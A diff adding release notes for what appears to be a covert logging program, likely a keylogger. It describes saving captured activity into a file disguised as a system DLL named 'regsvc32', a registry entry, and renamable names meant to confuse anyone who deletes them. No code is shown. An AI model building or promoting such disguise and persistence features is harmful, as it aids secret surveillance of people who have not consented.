@@ -1,0 +1,12 @@
+The new features include:
+
+
+	Will not save empty logs to the dll. (If the comp is Idle for a long time, the app won't keep saving empty logs. It will only save when an action is performed :-))
+
+	Better file size getter
+
+	NOW INCORPERATES THE SETTINGS.INI FILE! What this does is that it will name the dll (that has the info) and the registry key what you enter as a name. By default it is "regsvc32", but if you entered (for example) 'muscapp32" or something else, it will now save the dll to that name. This is great because if someone found out the dll file and is taking the info as well as you (or deleting the dll), the app will now save to the renamed dll! SWEEEEEETTT!!!! Plus, if someone keeps deleting the registry entry named 'regsvc32', it will now read another title, confusing them.
+
+	Now takes up less ram.
+
+	If the settings.ini is deleted or something like that, my app will just default to regsvc32 instead of crashing!!!!!!!!!!!
